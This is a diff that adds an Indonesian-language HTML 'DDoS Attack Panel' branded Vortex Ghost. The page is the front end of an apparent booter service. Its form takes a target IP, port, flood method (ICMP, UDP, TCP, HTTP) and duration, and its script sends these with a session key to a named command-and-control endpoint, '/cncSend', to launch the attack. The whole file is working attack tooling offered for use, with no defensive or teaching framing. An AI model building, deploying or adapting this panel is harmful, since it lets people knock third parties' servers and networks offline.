@@ -1,0 +1,209 @@
+<!-- ddos.html -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>DDoS Attack Panel - Vortex Ghost</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0D0221; color: #fff; font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh; background: linear-gradient(180deg, #0D0221 0%, #1A0533 50%, #0D0221 100%);
+        }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #7B1FA2; border-radius: 4px; }
+
+        .app-header {
+            display: flex; align-items: center; padding: 16px 20px;
+            background: rgba(13,2,33,0.95); border-bottom: 1px solid rgba(234,128,252,0.1);
+            position: sticky; top: 0; z-index: 10;
+        }
+        .app-header .back-btn {
+            background: none; border: none; color: #EA80FC; font-size: 20px;
+            cursor: pointer; padding: 4px; margin-right: 12px;
+        }
+        .app-header .title {
+            font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 16px;
+            color: #fff; flex: 1; text-align: center;
+        }
+
+        .container { max-width: 500px; margin: 0 auto; padding: 16px 20px; padding-bottom: 40px; }
+
+        .card {
+            background: rgba(255,255,255,0.05); border-radius: 20px; padding: 20px;
+            border: 1px solid rgba(123,31,162,0.2); margin-bottom: 16px;
+        }
+        .card .header {
+            display: flex; align-items: center; gap: 10px; margin-bottom: 12px;
+        }
+        .card .header i { color: #EA80FC; font-size: 18px; }
+        .card .header h3 { font-family: 'Orbitron', sans-serif; font-size: 14px; color: #EA80FC; }
+
+        .form-group { margin-bottom: 14px; }
+        .form-group:last-child { margin-bottom: 0; }
+        .form-group label {
+            display: block; font-size: 11px; color: rgba(255,255,255,0.5);
+            font-family: 'Orbitron', sans-serif; letter-spacing: 1px; margin-bottom: 4px;
+        }
+        .form-group input, .form-group select {
+            width: 100%; padding: 14px 16px; border-radius: 12px;
+            border: 1px solid rgba(123,31,162,0.3); background: rgba(255,255,255,0.05);
+            color: #fff; font-family: 'Share Tech Mono', monospace; font-size: 14px;
+            outline: none; transition: border 0.2s;
+        }
+        .form-group input:focus, .form-group select:focus { border-color: #EA80FC; }
+        .form-group input::placeholder { color: rgba(255,255,255,0.3); }
+        .form-group select option { background: #0D0221; }
+
+        .btn-launch {
+            width: 100%; padding: 18px; border: none; border-radius: 16px;
+            font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 16px;
+            cursor: pointer; transition: all 0.2s; margin-top: 8px;
+            background: linear-gradient(135deg, #7B1FA2, #EA80FC); color: #fff;
+            box-shadow: 0 8px 30px rgba(123,31,162,0.3);
+        }
+        .btn-launch:hover { transform: scale(1.02); }
+        .btn-launch:disabled { opacity: 0.6; cursor: not-allowed; transform: scale(1); }
+        .btn-launch .spinner { display: none; width: 24px; height: 24px; margin: 0 auto; border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .btn-launch.loading .btn-text { display: none; }
+        .btn-launch.loading .spinner { display: block; }
+
+        .alert {
+            padding: 14px 16px; border-radius: 12px; margin-top: 12px; display: none;
+            font-size: 14px; text-align: center;
+        }
+        .alert.show { display: block; }
+        .alert.success { background: rgba(76,175,80,0.15); border: 1px solid #4CAF50; color: #4CAF50; }
+        .alert.error { background: rgba(255,0,0,0.1); border: 1px solid #ff6b6b; color: #ff6b6b; }
+        .alert.info { background: rgba(234,128,252,0.1); border: 1px solid #EA80FC; color: #EA80FC; }
+
+        .toast {
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+            max-width: 500px; width: calc(100% - 32px); padding: 14px 20px;
+            border-radius: 12px; font-size: 14px; font-weight: 600; z-index: 2000;
+            display: none; text-align: center; box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+            animation: slideUp 0.3s ease;
+        }
+        .toast.show { display: block; }
+        .toast.success { background: rgba(76,175,80,0.9); color: #fff; }
+        .toast.error { background: rgba(255,0,0,0.85); color: #fff; }
+        .toast.info { background: rgba(123,31,162,0.9); color: #fff; }
+        @keyframes slideUp { from { opacity:0; transform:translateX(-50%) translateY(20px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }
+    </style>
+</head>
+<body>
+    <header class="app-header">
+        <button class="back-btn" onclick="window.location.href='dashboard.html'"><i class="fas fa-arrow-left"></i></button>
+        <span class="title">🚀 ATTACK PANEL</span>
+        <div style="width:36px;"></div>
+    </header>
+    <div class="container">
+        <div class="card">
+            <div class="header"><i class="fas fa-crosshairs"></i><h3>TARGET INPUT</h3></div>
+            <div class="form-group">
+                <label>IP TARGET</label>
+                <input type="text" id="targetInput" placeholder="1.1.1.1" />
+            </div>
+            <div class="form-group">
+                <label>PORT</label>
+                <input type="text" id="portInput" placeholder="80" />
+            </div>
+            <div class="form-group">
+                <label>METODE ATTACK</label>
+                <select id="methodSelect">
+                    <option value="icmp">ICMP</option>
+                    <option value="udp">UDP</option>
+                    <option value="tcp">TCP</option>
+                    <option value="http">HTTP</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>DURASI (DETIK)</label>
+                <input type="range" id="durationSlider" min="10" max="300" value="60" />
+                <div style="display:flex;justify-content:space-between;color:rgba(255,255,255,0.3);font-size:11px;margin-top:4px;">
+                    <span>10s</span>
+                    <span id="durationLabel">60s</span>
+                    <span>300s</span>
+                </div>
+            </div>
+        </div>
+
+        <button class="btn-launch" id="launchBtn" onclick="launchAttack()">
+            <span class="btn-text"><i class="fas fa-bolt"></i> LAUNCH ATTACK</span>
+            <span class="spinner"></span>
+        </button>
+
+        <div class="alert" id="alert"></div>
+    </div>
+    <div class="toast" id="toast"></div>
+
+    <script>
+        const API_BASE = 'http://private.lynzzofficial.com:2355';
+        const sessionKey = localStorage.getItem('sessionKey') || '';
+        const username = localStorage.getItem('username') || '';
+
+        function showToast(msg, type='info') {
+            const t = document.getElementById('toast');
+            t.textContent = msg; t.className = 'toast show ' + type;
+            clearTimeout(t._timer); t._timer = setTimeout(() => { t.className = 'toast'; }, 3000);
+        }
+
+        function setLoading(loading) {
+            const btn = document.getElementById('launchBtn');
+            if (loading) { btn.classList.add('loading'); btn.disabled = true; }
+            else { btn.classList.remove('loading'); btn.disabled = false; }
+        }
+
+        function showAlert(msg, type='info') {
+            const el = document.getElementById('alert');
+            el.textContent = msg;
+            el.className = 'alert show ' + type;
+            setTimeout(() => { el.className = 'alert'; }, 5000);
+        }
+
+        document.getElementById('durationSlider').addEventListener('input', function() {
+            document.getElementById('durationLabel').textContent = this.value + 's';
+        });
+
+        window.launchAttack = function() {
+            const target = document.getElementById('targetInput').value.trim();
+            const port = document.getElementById('portInput').value.trim();
+            const method = document.getElementById('methodSelect').value;
+            const duration = document.getElementById('durationSlider').value;
+
+            if (!target) { showToast('Masukkan target IP!', 'error'); return; }
+            if (method !== 'icmp' && !port) { showToast('Masukkan port!', 'error'); return; }
+
+            setLoading(true);
+            const url = `${API_BASE}/cncSend?key=${sessionKey}&target=${target}&ddos=${method}&port=${port || 0}&duration=${duration}`;
+
+            fetch(url)
+                .then(res => res.json())
+                .then(data => {
+                    setLoading(false);
+                    if (data.cooldown) {
+                        showAlert('⏳ Cooldown: Tunggu beberapa saat.', 'info');
+                    } else if (data.valid === false) {
+                        showAlert('❌ Invalid session key.', 'error');
+                    } else if (data.sended === false) {
+                        showAlert('⚠️ Gagal mengirim attack.', 'error');
+                    } else {
+                        showAlert(`✅ Attack berhasil dikirim ke ${target} selama ${duration}s!`, 'success');
+                        showToast(`✅ Attack sent to ${target}`, 'success');
+                    }
+                })
+                .catch(() => {
+                    setLoading(false);
+                    showAlert('❌ Error: Gagal terhubung ke server.', 'error');
+                });
+        };
+
+        if (!sessionKey || !username) window.location.href = 'login.html';
+    </script>
+</body>
+</html>
